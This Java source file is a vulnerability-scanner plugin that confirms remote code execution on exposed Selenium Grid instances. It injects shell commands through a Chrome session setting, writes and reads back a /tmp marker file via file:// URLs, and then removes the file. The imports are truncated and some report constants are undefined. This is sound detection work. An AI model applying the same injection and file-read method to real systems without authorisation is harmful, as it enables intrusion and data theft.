
Import….
import java.io.IOException;
import java.time.Clock;
import java.time.Instant;
import javax.inject.Inject;
import java.time.Duration;

@PluginInfo(
    type = PluginType.VULN_DETECTION,
    name = "RCEViaExposedSeleniumGridDetector",
    version = "0.1",
    description = "This plugin detects RCE via exposed Selenium Grid.",
    author = "Dawi",
    bootstrapModule = RCEViaExposedSeleniumGridDetectorBootstrapModule.class)

public final class RCEViaExposedSeleniumGridDetector implements VulnDetector {
  @VisibleForTesting static final String VULNERABILITY_REPORT_PUBLISHER = "";

  @VisibleForTesting
  static final String VULNERABILITY_REPORT_ID = "RCEViaExposedSeleniumGridDetector";

  @VisibleForTesting
  static final String VULNERABILITY_REPORT_TITLE =
      "Selenium Grid Remote Code Execution";
   
  private static final ScannerLogger logger = ScannerLogger.forEnclosingClass();

  private final Clock utcClock;
  private final HttpClient httpClient;
  private final PayloadGenerator payloadGenerator;
  private final String payloadFormatString;
  private final String seleniumUrlPayload;
  private final String seleniumSessionSettings;
  private static final String SELENIUM_GRID_SERVICE_PATH = "wd/hub";
  private final String RCE_TEST_FILE_PATH = 
      "/tmp/scanneri-selenium-rce-" + Long.toHexString(Double.doubleToLongBits(Math.random()));
  private final String RCE_TEST_FILE_CONTENTS = "scanner-selenium-rce-executed";

  // scanner scanner relies heavily on Guice framework. So all the utility dependencies of your
  // plugin must be injected through the constructor of the detector. Notably, the Payload
  // generator is injected this way.
  @Inject
  RCEViaExposedSeleniumGridDetector(
      @UtcClock Clock utcClock, HttpClient httpClient, PayloadGenerator payloadGenerator) 
      throws IOException {
    this.utcClock = checkNotNull(utcClock);
    // TODO: setReadTimeout() method is missing in scanner HttpClient.java. 
    // It is needed to avoid false negatives. See TODO(b/145315535) in scanner-scanner
    // Enable the line below once this bug has been fixed.
    //this.httpClient = httpClient.modify().setReadTimeout(Duration.ofSeconds(20)).build();
    this.httpClient = httpClient.modify().setConnectTimeout(Duration.ofSeconds(10)).build();
    this.payloadGenerator = checkNotNull(payloadGenerator);
    
    this.payloadFormatString =
        String.format(
            Resources.toString(
                Resources.getResource(this.getClass(), "payloadFormatString.json"), UTF_8),
            "%s"); // Placeholder for the command payload

    this.seleniumSessionSettings = Resources.toString( 
        Resources.getResource(this.getClass(), "payloadSessionSettings.json"), UTF_8);

    this.seleniumUrlPayload =
        String.format(
            Resources.toString(
                Resources.getResource(this.getClass(), "payloadSeleniumUrl.json"), UTF_8),
            "%s"); // Placeholder for URL        
                        
  }

  // This is the main entry point of VulnDetector.
  @Override
  public DetectionReportList detect(
      TargetInfo targetInfo, ImmutableList<NetworkService> matchedServices) {
    logger.atInfo().log("RCEViaExposedSeleniumGridDetector starts detecting.");

    return DetectionReportList.newBuilder()
        .addAllDetectionReports(
            matchedServices.stream()
                //TODO: This filter doesn't trigger this detector.
                //.filter(NetworkServiceUtils::isWebService)          

                // Check individual NetworkService whether it is vulnerable.                     
                .filter(this::isServiceVulnerable)
                // Build DetectionReport message for vulnerable services.
                .map(networkService -> buildDetectionReport(targetInfo, networkService))
                .collect(toImmutableList()))
        .build();
  }

  
  private boolean isServiceVulnerable(NetworkService networkService) {

    String statusUri = buildTargetUrl(networkService, SELENIUM_GRID_SERVICE_PATH + "/status");

    // Check if Selenium Grid is exposed and ready for new requests.
    if (!isSeleniumGridExposedAndReady(networkService, statusUri)) {
        logger.atInfo().log("Selenium Grid is not exposed, or not ready at %s.", statusUri);
        return false;
    }   
    
    // Check for RCE       
    logger.atInfo().log("Selenium Grid is exposed at '%s'. Checking for RCE.", statusUri);   

    // Tell the PayloadGenerator what kind of vulnerability we are detecting
    PayloadGeneratorConfig config =
        PayloadGeneratorConfig.newBuilder()
            .setVulnerabilityType(PayloadGeneratorConfig.VulnerabilityType.REFLECTIVE_RCE)
            .setInterpretationEnvironment(
                PayloadGeneratorConfig.InterpretationEnvironment.LINUX_SHELL)
            .setExecutionEnvironment(
                PayloadGeneratorConfig.ExecutionEnvironment.EXEC_INTERPRETATION_ENVIRONMENT)
            .build();
    Payload payload = this.payloadGenerator.generate(config);
    String commandToInject = payload.getPayload();
    
    // Confirm RCE by using the callback server if available
    if (payload.getPayloadAttributes().getUsesCallbackServer()) {
        logger.atInfo().log("Executing command via Selenium: " + commandToInject); 
        executeCommandViaSelenium(networkService, commandToInject);    
        logger.atInfo().log("Confirming Selenium Grid RCE with the callback server");  
        return payload.checkIfExecuted();
    }   

    // Use an alternative approach if the callback server is not available.
    logger.atInfo().log("Callback server disabled. Confirming RCE with an alternative method."); 

    // Execute curl command to create a test file in /tmp with a predefined string.
    // curl will write the string into the trace log as result of a DNS resolution error. 
    // Example trace log contents:
    // == Info: Could not resolve host: scanner-selenium-rce-executed
    commandToInject = String.format("curl --trace %s %s", 
        RCE_TEST_FILE_PATH, RCE_TEST_FILE_CONTENTS);
    executeCommandViaSelenium(networkService, commandToInject);  

    // Check if the RCE test file got created and contains our RCE test string/anchor
    String rceTestFileContents;
    rceTestFileContents = readFileViaSelenium(networkService, RCE_TEST_FILE_PATH);
    if (rceTestFileContents != null && rceTestFileContents.contains(RCE_TEST_FILE_CONTENTS)) {
        // Vulnerable
        logger.atInfo().log("RCE Payload executed! File %s exists and contains %s payload", 
            RCE_TEST_FILE_PATH, RCE_TEST_FILE_CONTENTS);
       
        // Cleanup created file
        logger.atInfo().log("Cleaning up created RCE test file.");
        commandToInject = String.format("rm %s ", RCE_TEST_FILE_PATH);
        executeCommandViaSelenium(networkService, commandToInject);

        return true;
    } 
    
    // Not vulnerable
    logger.atInfo().log("File %s doesn't exist or doesn't contain %s payload", 
            RCE_TEST_FILE_PATH, RCE_TEST_FILE_CONTENTS);  
    
    return false;
  }

  private static String buildTargetUrl(NetworkService networkService, String path) {
    StringBuilder targetUrlBuilder = new StringBuilder();
    if (NetworkServiceUtils.isWebService(networkService)) {
      targetUrlBuilder.append(NetworkServiceUtils.buildWebApplicationRootUrl(networkService));
    } else {
      // Default to HTTP protocol when the scanner cannot identify the actual service.
      // HTTP is also used in a default Selenium Grid install.
      targetUrlBuilder
          .append("http://")
          .append(toUriAuthority(networkService.getNetworkEndpoint()))
          .append("/");
    }
    targetUrlBuilder.append(path);
    return targetUrlBuilder.toString();
  }

  // Verifies that Selenium Grid is exposed and accepts new requests to avoid stuck requests.
  private boolean isSeleniumGridExposedAndReady(NetworkService networkService, String statusUri) {
    boolean seleniumIsReady;
 
    try {
        HttpResponse response = 
            httpClient.send(get(statusUri).withEmptyHeaders().build(), networkService);        
  
        if (!response.status().isSuccess() || response.bodyJson().isEmpty()) {
          logger.atInfo().log("Unable to access Selenium status endpoint.");
          return false;
        }        
        JsonObject jsonResponse = (JsonObject) response.bodyJson().get();   
        if (jsonResponse.keySet().contains("value")) {
          JsonObject value = (JsonObject) jsonResponse.get("value");
          JsonPrimitive readyPrimitive = value.getAsJsonPrimitive("ready");
          if (readyPrimitive != null) {
            seleniumIsReady = readyPrimitive.getAsBoolean();

          } else {
            logger.atInfo().log("Unable to retrieve Selenium status from the JSON response.");
            return false;
          }
          
        } else {
          logger.atInfo().log("Invalid Selenium Grid response.");
          return false;
        }
      } catch (JsonSyntaxException | IOException | AssertionError e) {
        logger.atWarning().withCause(e).log("Request to target %s failed", statusUri);
        return false;
      }    

    // Check if Selenium Grid is exposed but is not in ready state (stuck queue etc.)
    if (!seleniumIsReady) {
        logger.atInfo().log("Selenium Grid is exposed but status is not ready");
        return false;
    } 
    // Selenium Grid is ready to receive new requests
    logger.atInfo().log("Selenium Grid is exposed and is ready");
    return true;

  }

  // Executes command with --renderer-cmd-prefix Chrome driver setting.
  // This prevents a normal chrome instance startup which should result in a "tab crashed" error.
  // Returns true if the injected command caused a tab crash (command likely executed).
  private boolean executeCommandViaSelenium(NetworkService networkService, String command) {
    String targetUri = buildTargetUrl(networkService, SELENIUM_GRID_SERVICE_PATH + "/session");
    String reqPayload = String.format(payloadFormatString, command);
    boolean hasTabCrashed;

    logger.atInfo().log("Executing command via Selenium: " + command);
    HttpRequest req =
        HttpRequest.post(targetUri)
            .setHeaders(HttpHeaders.builder().addHeader(CONTENT_TYPE, "application/json").build())
            .setRequestBody(ByteString.copyFromUtf8(reqPayload))
            .build();
    try {
      HttpResponse response = httpClient.send(req, networkService);
      hasTabCrashed = (response
              .bodyString()
              .map(
                  body ->
                      body.contains("tab crashed"))
              .orElse(false)); 
    } catch (IOException e) {
      return false;
    }
    
    // Injected command in --renderer-cmd-prefix will prevent Chrome from starting up properly
    if (hasTabCrashed) {
      logger.atInfo().log("Chrome tab crashed, command likely executed.");
      return true;
    } else { 
      return false;
    }
  }

  // Reads a file with file:// browser protocol.
  // Returns the contents of the file read, or null if not successful / not found.
  private String readFileViaSelenium(NetworkService networkService, String filePath) {
    String targetUri = buildTargetUrl(networkService, SELENIUM_GRID_SERVICE_PATH + "/session");
    String seleniumSessionId = null;

    // Get Selenium Session ID
    logger.atInfo().log("Creating a Selenium Grid session");
    seleniumSessionId = createSeleniumSession(networkService);
    if (seleniumSessionId == null) {
        logger.atInfo().log("Failed to create a Selenium Grid session");
        return null;
    }

    // Request file to read via file:// protocol
    targetUri = buildTargetUrl(networkService, SELENIUM_GRID_SERVICE_PATH + "/session/" + 
        seleniumSessionId + "/url");
    String fileUri = "file://" + filePath;
    String fileReadPayload = String.format(seleniumUrlPayload, fileUri);  
    boolean fileRequestSubmitted = false;

    logger.atInfo().log("Requesting %s URI via Selenium Grid", fileUri);
    HttpRequest req =
        HttpRequest.post(targetUri)
            .setHeaders(HttpHeaders.builder().addHeader(CONTENT_TYPE, "application/json").build())
            .setRequestBody(ByteString.copyFromUtf8(fileReadPayload))
            .build();
    try {
      HttpResponse response = httpClient.send(req, networkService);
      fileRequestSubmitted = response.status().isSuccess();

    } catch (IOException e) {
      logger.atWarning().withCause(e).log("Request to target %s failed", targetUri);
    }

    if (!fileRequestSubmitted) {
        logger.atInfo().log("Selenium request to the %s URI failed.", fileUri);
        closeSeleniumSession(networkService, seleniumSessionId);
        return null;
    }

    // Read file contents via Selenium browser source code handler
    targetUri = buildTargetUrl(networkService, SELENIUM_GRID_SERVICE_PATH + "/session/" + 
        seleniumSessionId + "/source");  
    boolean fileRead;
    String fileContents = null;

    req =
        HttpRequest.get(targetUri)
            .setHeaders(HttpHeaders.builder().addHeader(CONTENT_TYPE, "application/json").build())
            .build();
    
    logger.atInfo().log("Attempting to get source of the requested file via %s", fileUri);        
    try {
      HttpResponse response = httpClient.send(req, networkService);

      if (response.status().isSuccess() || response.bodyJson().isPresent()) {
        JsonObject jsonResponse = (JsonObject) response.bodyJson().get();
        JsonPrimitive value = jsonResponse.getAsJsonPrimitive("value");
        if (value != null) {
            fileContents = value.getAsString();
            // Response will contain ERR_FILE_NOT_FOUND if file:// handler couldn't find the file 
            if (fileContents.contains("ERR_FILE_NOT_FOUND")) {
              logger.atInfo().log("File %s was not found on the target).", filePath);
              fileContents = null;
            }

        } else {
            logger.atInfo().log("Empty source value in JSON reply.");
        }      

      } else {
        logger.atInfo().log("Invalid JSON response to source request.");
      }
    } catch (JsonSyntaxException | IOException | AssertionError e) {
      logger.atWarning().withCause(e).log("Request to target %s failed", targetUri);
    }            

    // Close previously created Selenium session and return the file contents
    closeSeleniumSession(networkService, seleniumSessionId);

    return fileContents;


  } 

  // Opens a Selenium Grid session that is required to submit browser requests. 
  // Returns session ID string, or null if not successful.
  private String createSeleniumSession(NetworkService networkService) {
    String targetUri = buildTargetUrl(networkService, SELENIUM_GRID_SERVICE_PATH + "/session");
    String seleniumSessionId = null;

    HttpRequest req =
        HttpRequest.post(targetUri)
            .setHeaders(HttpHeaders.builder().addHeader(CONTENT_TYPE, "application/json").build())
            .setRequestBody(ByteString.copyFromUtf8(seleniumSessionSettings))
            .build();

    try {
      HttpResponse response = httpClient.send(req, networkService);

      if (response.status().isSuccess() || response.bodyJson().isPresent()) {      
        JsonObject jsonResponse = (JsonObject) response.bodyJson().get();
        JsonObject value = (JsonObject) jsonResponse.get("value");
        JsonPrimitive sessionPrimitive = value.getAsJsonPrimitive("sessionId");
        if (sessionPrimitive != null) {
            seleniumSessionId = sessionPrimitive.getAsString();
            logger.atInfo().log("Created a Selenium session with ID: %s.", seleniumSessionId);
            return seleniumSessionId;
        } else {
            logger.atInfo().log("Couldn't obtain Selenium session ID from JSON reply.");
        }
        
      } else {
        logger.atInfo().log("Invalid JSON reply. Couldn't establish a Selenium session.");
      }
    } catch (JsonSyntaxException | IOException | AssertionError e) {
      logger.atWarning().withCause(e).log("Request to target %s failed", targetUri);
    }

    return null;

  }

  // Close session. Returns true if successful
  private boolean closeSeleniumSession(NetworkService networkService, String seleniumSessionId) {

   logger.atInfo().log("Closing Selenium Session %s", seleniumSessionId);
   String targetUri = buildTargetUrl(networkService, SELENIUM_GRID_SERVICE_PATH + "/session/" + 
       seleniumSessionId);     
   HttpRequest req =
       HttpRequest.delete(targetUri)
           .setHeaders(HttpHeaders.builder().addHeader(CONTENT_TYPE, "application/json").build())
           .build();
   try {
     HttpResponse response = httpClient.send(req, networkService);
     if (!response.status().isSuccess()) { 
       logger.atInfo().log("Failed to close Selenium Grid session %s", seleniumSessionId);
       return false;
     } 

   } catch (IOException e) {
     logger.atWarning().withCause(e).log("Request to target %s failed", targetUri);
     return false;
   }    

   return true;

  }

  // This builds the DetectionReport message for a specific vulnerable network service.
  private DetectionReport buildDetectionReport(
      TargetInfo targetInfo, NetworkService vulnerableNetworkService) {
    return DetectionReport.newBuilder()
        .setTargetInfo(targetInfo)
        .setNetworkService(vulnerableNetworkService)
        .setDetectionTimestamp(Timestamps.fromMillis(Instant.now(utcClock).toEpochMilli()))
        .setDetectionStatus(DetectionStatus.VULNERABILITY_VERIFIED)
        .setVulnerability(
            Vulnerability.newBuilder()
                .setMainId(
                    VulnerabilityId.newBuilder()
                        .setPublisher(VULNERABILITY_REPORT_PUBLISHER)
                        .setValue(VULNERABILITY_REPORT_ID))
                .setSeverity(Severity.CRITICAL)
                .setTitle(VULNERABILITY_REPORT_TITLE)
                .setDescription(VULNERABILITY_REPORT_DESCRIPTION)
                .setRecommendation(VULNERABILITY_REPORT_RECOMMENDATION))
        .build();
  }
}


